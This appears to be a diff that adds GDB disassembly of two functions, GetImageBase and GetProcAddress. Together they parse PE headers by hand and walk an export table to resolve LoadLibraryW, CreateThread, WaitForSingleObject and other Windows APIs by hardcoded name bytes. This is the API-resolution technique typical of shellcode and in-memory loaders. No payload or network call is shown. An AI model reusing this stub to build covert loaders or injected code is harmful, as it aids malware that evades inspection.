+   0x00000000004009bb <+267>: 81 79 10 2e 00 44 00 cmpl   $0x44002e,0x10(%rcx)
+   0x00000000004009c2 <+274>: 0f 85 1e ff ff ff jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x00000000004009c8 <+280>: 48 8b 50 20 mov    0x20(%rax),%rdx
+   0x00000000004009cc <+284>: 48 89 97 18 0a 00 00 mov    %rdx,0xa18(%rdi)
+   0x00000000004009d3 <+291>: e9 0e ff ff ff jmpq   0x4008e6 <GetImageBase(Package*)+54>
+
+Dump of assembler code for function GetProcAddress(void*, Package*):
+   0x00000000004005b0 <+0>:   8b 47 3c mov    0x3c(%rdi),%eax
+   0x00000000004005b3 <+3>:   81 3c 07 50 45 00 00 cmpl   $0x4550,(%rdi,%rax,1)
+   0x00000000004005ba <+10>:  74 04 je     0x4005c0 <GetProcAddress(void*, Package*)+16>
+   0x00000000004005bc <+12>:  c3 retq   
+   0x00000000004005bd <+13>:  0f 1f 00 nopl   (%rax)
+   0x00000000004005c0 <+16>:  0f b7 54 07 04 movzwl 0x4(%rdi,%rax,1),%edx
+   0x00000000004005c5 <+21>:  66 81 fa 64 86 cmp    $0x8664,%dx
+   0x00000000004005ca <+26>:  0f 85 a0 02 00 00 jne    0x400870 <GetProcAddress(void*, Package*)+704>
+   0x00000000004005d0 <+32>:  66 81 fa 4c 01 cmp    $0x14c,%dx
+   0x00000000004005d5 <+37>:  b9 60 00 00 00 mov    $0x60,%ecx
+   0x00000000004005da <+42>:  ba 70 00 00 00 mov    $0x70,%edx
+   0x00000000004005df <+47>:  48 0f 45 ca cmovne %rdx,%rcx
+   0x00000000004005e3 <+51>:  48 01 f8 add    %rdi,%rax
+   0x00000000004005e6 <+54>:  8b 44 01 18 mov    0x18(%rcx,%rax,1),%eax
+   0x00000000004005ea <+58>:  48 01 f8 add    %rdi,%rax
+   0x00000000004005ed <+61>:  44 8b 48 20 mov    0x20(%rax),%r9d
+   0x00000000004005f1 <+65>:  44 8b 50 24 mov    0x24(%rax),%r10d
+   0x00000000004005f5 <+69>:  44 8b 58 1c mov    0x1c(%rax),%r11d
+   0x00000000004005f9 <+73>:  44 8b 40 18 mov    0x18(%rax),%r8d
+   0x00000000004005fd <+77>:  49 01 f9 add    %rdi,%r9
+   0x0000000000400600 <+80>:  49 01 fa add    %rdi,%r10
+   0x0000000000400603 <+83>:  49 01 fb add    %rdi,%r11
+   0x0000000000400606 <+86>:  45 85 c0 test   %r8d,%r8d
+   0x0000000000400609 <+89>:  74 b1 je     0x4005bc <GetProcAddress(void*, Package*)+12>
+   0x000000000040060b <+91>:  53 push   %rbx
+   0x000000000040060c <+92>:  31 c0 xor    %eax,%eax
+   0x000000000040060e <+94>:  eb 61 jmp    0x400671 <GetProcAddress(void*, Package*)+193>
+   0x0000000000400610 <+96>:  48 83 be 28 0a 00 00 00 cmpq   $0x0,0xa28(%rsi)
+   0x0000000000400618 <+104>: 0f 84 b2 00 00 00 je     0x4006d0 <GetProcAddress(void*, Package*)+288>
+   0x000000000040061e <+110>: 48 83 be 30 0a 00 00 00 cmpq   $0x0,0xa30(%rsi)
+   0x0000000000400626 <+118>: 0f 84 dc 00 00 00 je     0x400708 <GetProcAddress(void*, Package*)+344>
+   0x000000000040062c <+124>: 48 83 be 38 0a 00 00 00 cmpq   $0x0,0xa38(%rsi)
+   0x0000000000400634 <+132>: 0f 84 16 01 00 00 je     0x400750 <GetProcAddress(void*, Package*)+416>
+   0x000000000040063a <+138>: 48 83 be 40 0a 00 00 00 cmpq   $0x0,0xa40(%rsi)
+   0x0000000000400642 <+146>: 0f 84 48 01 00 00 je     0x400790 <GetProcAddress(void*, Package*)+480>
+   0x0000000000400648 <+152>: 48 83 be 48 0a 00 00 00 cmpq   $0x0,0xa48(%rsi)
+   0x0000000000400650 <+160>: 0f 84 c2 01 00 00 je     0x400818 <GetProcAddress(void*, Package*)+616>
+   0x0000000000400656 <+166>: 48 83 be 50 0a 00 00 00 cmpq   $0x0,0xa50(%rsi)
+   0x000000000040065e <+174>: 0f 84 7c 01 00 00 je     0x4007e0 <GetProcAddress(void*, Package*)+560>
+   0x0000000000400664 <+180>: 48 83 c0 01 add    $0x1,%rax
+   0x0000000000400668 <+184>: 41 39 c0 cmp    %eax,%r8d
+   0x000000000040066b <+187>: 0f 86 f7 01 00 00 jbe    0x400868 <GetProcAddress(void*, Package*)+696>
+   0x0000000000400671 <+193>: 41 0f b7 0c 42 movzwl (%r10,%rax,2),%ecx
+   0x0000000000400676 <+198>: 41 8b 14 81 mov    (%r9,%rax,4),%edx
+   0x000000000040067a <+202>: 41 8b 0c 8b mov    (%r11,%rcx,4),%ecx
+   0x000000000040067e <+206>: 48 01 fa add    %rdi,%rdx
+   0x0000000000400681 <+209>: 48 01 f9 add    %rdi,%rcx
+   0x0000000000400684 <+212>: 48 83 be 20 0a 00 00 00 cmpq   $0x0,0xa20(%rsi)
+   0x000000000040068c <+220>: 75 82 jne    0x400610 <GetProcAddress(void*, Package*)+96>
+   0x000000000040068e <+222>: 81 3a 4c 6f 61 64 cmpl   $0x64616f4c,(%rdx)
+   0x0000000000400694 <+228>: 0f 85 76 ff ff ff jne    0x400610 <GetProcAddress(void*, Package*)+96>
+   0x000000000040069a <+234>: 81 7a 04 4c 69 62 72 cmpl   $0x7262694c,0x4(%rdx)
+   0x00000000004006a1 <+241>: 0f 85 69 ff ff ff jne    0x400610 <GetProcAddress(void*, Package*)+96>
+   0x00000000004006a7 <+247>: 81 7a 08 61 72 79 57 cmpl   $0x57797261,0x8(%rdx)
+   0x00000000004006ae <+254>: 0f 85 5c ff ff ff jne    0x400610 <GetProcAddress(void*, Package*)+96>
+   0x00000000004006b4 <+260>: 80 7a 0c 00 cmpb   $0x0,0xc(%rdx)
+   0x00000000004006b8 <+264>: 0f 85 52 ff ff ff jne    0x400610 <GetProcAddress(void*, Package*)+96>
+   0x00000000004006be <+270>: 48 89 8e 20 0a 00 00 mov    %rcx,0xa20(%rsi)
+   0x00000000004006c5 <+277>: eb 9d jmp    0x400664 <GetProcAddress(void*, Package*)+180>
+   0x00000000004006c7 <+279>: 66 0f 1f 84 00 00 00 00 00 nopw   0x0(%rax,%rax,1)
+   0x00000000004006d0 <+288>: 81 3a 46 72 65 65 cmpl   $0x65657246,(%rdx)
+   0x00000000004006d6 <+294>: 0f 85 42 ff ff ff jne    0x40061e <GetProcAddress(void*, Package*)+110>
+   0x00000000004006dc <+300>: 81 7a 04 4c 69 62 72 cmpl   $0x7262694c,0x4(%rdx)
+   0x00000000004006e3 <+307>: 0f 85 35 ff ff ff jne    0x40061e <GetProcAddress(void*, Package*)+110>
+   0x00000000004006e9 <+313>: 81 7a 08 61 72 79 00 cmpl   $0x797261,0x8(%rdx)
+   0x00000000004006f0 <+320>: 0f 85 28 ff ff ff jne    0x40061e <GetProcAddress(void*, Package*)+110>
+   0x00000000004006f6 <+326>: 48 89 8e 28 0a 00 00 mov    %rcx,0xa28(%rsi)
+   0x00000000004006fd <+333>: e9 62 ff ff ff jmpq   0x400664 <GetProcAddress(void*, Package*)+180>
+   0x0000000000400702 <+338>: 66 0f 1f 44 00 00 nopw   0x0(%rax,%rax,1)
+   0x0000000000400708 <+344>: 81 3a 47 65 74 50 cmpl   $0x50746547,(%rdx)
+   0x000000000040070e <+350>: 0f 85 18 ff ff ff jne    0x40062c <GetProcAddress(void*, Package*)+124>
+   0x0000000000400714 <+356>: 81 7a 04 72 6f 63 41 cmpl   $0x41636f72,0x4(%rdx)
+   0x000000000040071b <+363>: 0f 85 0b ff ff ff jne    0x40062c <GetProcAddress(void*, Package*)+124>
+   0x0000000000400721 <+369>: 81 7a 08 64 64 72 65 cmpl   $0x65726464,0x8(%rdx)
+   0x0000000000400728 <+376>: 0f 85 fe fe ff ff jne    0x40062c <GetProcAddress(void*, Package*)+124>
+   0x000000000040072e <+382>: 8b 5a 0c mov    0xc(%rdx),%ebx
+   0x0000000000400731 <+385>: 81 e3 ff ff ff 00 and    $0xffffff,%ebx
+   0x0000000000400737 <+391>: 81 fb 73 73 00 00 cmp    $0x7373,%ebx
+   0x000000000040073d <+397>: 0f 85 e9 fe ff ff jne    0x40062c <GetProcAddress(void*, Package*)+124>
+   0x0000000000400743 <+403>: 48 89 8e 30 0a 00 00 mov    %rcx,0xa30(%rsi)
+   0x000000000040074a <+410>: e9 15 ff ff ff jmpq   0x400664 <GetProcAddress(void*, Package*)+180>
+   0x000000000040074f <+415>: 90 nop
+   0x0000000000400750 <+416>: 81 3a 43 72 65 61 cmpl   $0x61657243,(%rdx)
+   0x0000000000400756 <+422>: 0f 85 de fe ff ff jne    0x40063a <GetProcAddress(void*, Package*)+138>
+   0x000000000040075c <+428>: 81 7a 04 74 65 54 68 cmpl   $0x68546574,0x4(%rdx)
+   0x0000000000400763 <+435>: 0f 85 d1 fe ff ff jne    0x40063a <GetProcAddress(void*, Package*)+138>
+   0x0000000000400769 <+441>: 81 7a 08 72 65 61 64 cmpl   $0x64616572,0x8(%rdx)
+   0x0000000000400770 <+448>: 0f 85 c4 fe ff ff jne    0x40063a <GetProcAddress(void*, Package*)+138>
+   0x0000000000400776 <+454>: 80 7a 0c 00 cmpb   $0x0,0xc(%rdx)
+   0x000000000040077a <+458>: 0f 85 ba fe ff ff jne    0x40063a <GetProcAddress(void*, Package*)+138>
+   0x0000000000400780 <+464>: 48 89 8e 38 0a 00 00 mov    %rcx,0xa38(%rsi)
+   0x0000000000400787 <+471>: e9 d8 fe ff ff jmpq   0x400664 <GetProcAddress(void*, Package*)+180>
+   0x000000000040078c <+476>: 0f 1f 40 00 nopl   0x0(%rax)
+   0x0000000000400790 <+480>: 81 3a 52 74 6c 45 cmpl   $0x456c7452,(%rdx)
+   0x0000000000400796 <+486>: 0f 85 ac fe ff ff jne    0x400648 <GetProcAddress(void*, Package*)+152>
+   0x000000000040079c <+492>: 81 7a 04 78 69 74 55 cmpl   $0x55746978,0x4(%rdx)
+   0x00000000004007a3 <+499>: 0f 85 9f fe ff ff jne    0x400648 <GetProcAddress(void*, Package*)+152>
+   0x00000000004007a9 <+505>: 81 7a 08 73 65 72 54 cmpl   $0x54726573,0x8(%rdx)
+   0x00000000004007b0 <+512>: 0f 85 92 fe ff ff jne    0x400648 <GetProcAddress(void*, Package*)+152>
+   0x00000000004007b6 <+518>: 81 7a 0c 68 72 65 61 cmpl   $0x61657268,0xc(%rdx)
+   0x00000000004007bd <+525>: 0f 85 85 fe ff ff jne    0x400648 <GetProcAddress(void*, Package*)+152>
+   0x00000000004007c3 <+531>: 66 83 7a 10 64 cmpw   $0x64,0x10(%rdx)
+   0x00000000004007c8 <+536>: 0f 85 7a fe ff ff jne    0x400648 <GetProcAddress(void*, Package*)+152>
+   0x00000000004007ce <+542>: 48 89 8e 40 0a 00 00 mov    %rcx,0xa40(%rsi)
+   0x00000000004007d5 <+549>: e9 8a fe ff ff jmpq   0x400664 <GetProcAddress(void*, Package*)+180>
+   0x00000000004007da <+554>: 66 0f 1f 44 00 00 nopw   0x0(%rax,%rax,1)
+   0x00000000004007e0 <+560>: 81 3a 43 6c 6f 73 cmpl   $0x736f6c43,(%rdx)
+   0x00000000004007e6 <+566>: 0f 85 78 fe ff ff jne    0x400664 <GetProcAddress(void*, Package*)+180>
+   0x00000000004007ec <+572>: 81 7a 04 65 48 61 6e cmpl   $0x6e614865,0x4(%rdx)
+   0x00000000004007f3 <+579>: 0f 85 6b fe ff ff jne    0x400664 <GetProcAddress(void*, Package*)+180>
+   0x00000000004007f9 <+585>: 81 7a 08 64 6c 65 00 cmpl   $0x656c64,0x8(%rdx)
+   0x0000000000400800 <+592>: 0f 85 5e fe ff ff jne    0x400664 <GetProcAddress(void*, Package*)+180>
+   0x0000000000400806 <+598>: 48 89 8e 50 0a 00 00 mov    %rcx,0xa50(%rsi)
+   0x000000000040080d <+605>: e9 52 fe ff ff jmpq   0x400664 <GetProcAddress(void*, Package*)+180>
+   0x0000000000400812 <+610>: 66 0f 1f 44 00 00 nopw   0x0(%rax,%rax,1)
+   0x0000000000400818 <+616>: 81 3a 57 61 69 74 cmpl   $0x74696157,(%rdx)
+   0x000000000040081e <+622>: 0f 85 32 fe ff ff jne    0x400656 <GetProcAddress(void*, Package*)+166>
+   0x0000000000400824 <+628>: 81 7a 04 46 6f 72 53 cmpl   $0x53726f46,0x4(%rdx)
+   0x000000000040082b <+635>: 0f 85 25 fe ff ff jne    0x400656 <GetProcAddress(void*, Package*)+166>
+   0x0000000000400831 <+641>: 81 7a 08 69 6e 67 6c cmpl   $0x6c676e69,0x8(%rdx)
+   0x0000000000400838 <+648>: 0f 85 18 fe ff ff jne    0x400656 <GetProcAddress(void*, Package*)+166>
+   0x000000000040083e <+654>: 81 7a 0c 65 4f 62 6a cmpl   $0x6a624f65,0xc(%rdx)
+   0x0000000000400845 <+661>: 0f 85 0b fe ff ff jne    0x400656 <GetProcAddress(void*, Package*)+166>
+   0x000000000040084b <+667>: 81 7a 10 65 63 74 00 cmpl   $0x746365,0x10(%rdx)
+   0x0000000000400852 <+674>: 0f 85 fe fd ff ff jne    0x400656 <GetProcAddress(void*, Package*)+166>
+   0x0000000000400858 <+680>: 48 89 8e 48 0a 00 00 mov    %rcx,0xa48(%rsi)
+   0x000000000040085f <+687>: e9 00 fe ff ff jmpq   0x400664 <GetProcAddress(void*, Package*)+180>
+   0x0000000000400864 <+692>: 0f 1f 40 00 nopl   0x0(%rax)
+   0x0000000000400868 <+696>: 5b pop    %rbx
+   0x0000000000400869 <+697>: c3 retq   
+   0x000000000040086a <+698>: 66 0f 1f 44 00 00 nopw   0x0(%rax,%rax,1)
+   0x0000000000400870 <+704>: 66 81 fa 4c 01 cmp    $0x14c,%dx
+   0x0000000000400875 <+709>: 0f 84 55 fd ff ff je     0x4005d0 <GetProcAddress(void*, Package*)+32>
+   0x000000000040087b <+715>: 0f 1f 44 00 00 nopl   0x0(%rax,%rax,1)
+   0x0000000000400880 <+720>: e9 37 fd ff ff jmpq   0x4005bc <GetProcAddress(void*, Package*)+12>
